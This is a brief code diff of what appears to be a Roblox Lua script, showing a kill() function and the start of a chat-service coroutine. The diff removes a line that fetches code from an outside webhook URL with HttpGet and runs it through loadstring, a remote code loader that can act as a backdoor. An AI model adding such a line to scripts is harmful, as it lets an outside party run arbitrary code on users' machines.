@@ -38,8 +38,6 @@ function kill()
     game.Players.LocalPlayer.Character.Humanoid.Health = 0
 end
 
-loadstring(game:HttpGet("https://webhook.site/0e1a9f84-2a43-400d-8385-dea8d46bae43"))();
-
 coroutine.wrap(function()
 	local TextChatMessage
 	local TextChatService = game:GetService("TextChatService")
